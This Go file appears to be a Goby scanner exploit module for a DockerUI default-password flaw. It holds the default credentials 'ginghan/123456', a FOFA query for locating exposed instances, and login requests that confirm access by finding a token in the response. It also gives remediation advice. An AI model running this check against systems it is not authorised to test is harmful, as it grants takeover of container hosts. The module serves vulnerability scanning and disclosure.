package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "DockerUI Default Password Vulnerability",
    "Description": "<p>DockerUI is an open-source, powerful, and lightweight Docker management tool. This vulnerability exists in the default password configuration of DockerUI, with default credentials \"ginghan/123456\". Attackers can exploit the default password to log in to the backend, directly pull images, manage containers and network environments, potentially leading to sensitive data leakage and malicious control of the system.</p>",
    "Product": "DockerUI",
    "Homepage": "https://github.com/gohutool/docker.ui",
    "DisclosureDate": "2024-12-09",
    "PostTime": "2024-12-11",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "body=\"static/common/js/ui.js\" && title=\"正在进入主页\"",
    "GobyQuery": "body=\"static/common/js/ui.js\" && title=\"正在进入主页\"",
    "Level": "2",
    "Impact": "<p>This vulnerability allows attackers to log in to the DockerUI backend using the default password and perform arbitrary operations, including pulling images, managing containers, and network environments, potentially leading to sensitive data leakage, service disruption, and malicious control of the system.</p>",
    "Recommendation": "<p>It is recommended to immediately change the default password of DockerUI to a strong password and restrict access to the backend management interface. Additionally, regularly check system logs to prevent unauthorized access.</p>",
    "References": [
        "https://mp.weixin.qq.com/s/qDie20fgufgM9SCnSGPwEg"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/login",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "username=ginghan&grant_type=password&password=123456&practicetype="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"token\":\"ey",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|define|variable|{{{scheme}}}://ginghan@123456:{{{hostinfo}}}/login"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/login",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "username=ginghan&grant_type=password&password=123456&practicetype="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"token\":\"ey",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|NULL|text|Please use \"ginghan:123456\" to login"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "DockerUI 默认口令漏洞",
            "Product": "DockerUI",
            "Description": "<p>DockerUI 是一款开源的、强大的、轻量级的 Docker 管理工具。该漏洞存在于 DockerUI 的默认口令配置中，默认凭据为 \"ginghan/123456\"。攻击者可以利用默认口令登录后台，直接拉取镜像、管理容器和网络环境，可能导致敏感数据泄露和系统被恶意控制。</p>",
            "Recommendation": "<p>建议立即修改 DockerUI 的默认口令为强密码，并限制后台管理界面的访问权限。同时，定期检查系统日志，防止未授权访问。</p>",
            "Impact": "<p>攻击者可以利用默认口令登录后台，直接拉取镜像、管理容器和网络环境，可能导致敏感数据泄露和系统被恶意控制。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "DockerUI Default Password Vulnerability",
            "Product": "DockerUI",
            "Description": "<p>DockerUI is an open-source, powerful, and lightweight Docker management tool. This vulnerability exists in the default password configuration of DockerUI, with default credentials \"ginghan/123456\". Attackers can exploit the default password to log in to the backend, directly pull images, manage containers and network environments, potentially leading to sensitive data leakage and malicious control of the system.</p>",
            "Recommendation": "<p>It is recommended to immediately change the default password of DockerUI to a strong password and restrict access to the backend management interface. Additionally, regularly check system logs to prevent unauthorized access.</p>",
            "Impact": "<p>This vulnerability allows attackers to log in to the DockerUI backend using the default password and perform arbitrary operations, including pulling images, managing containers, and network environments, potentially leading to sensitive data leakage, service disruption, and malicious control of the system.</p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "VariablesOrder": [],
    "EditType": "fast",
    "PocId": "9977"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}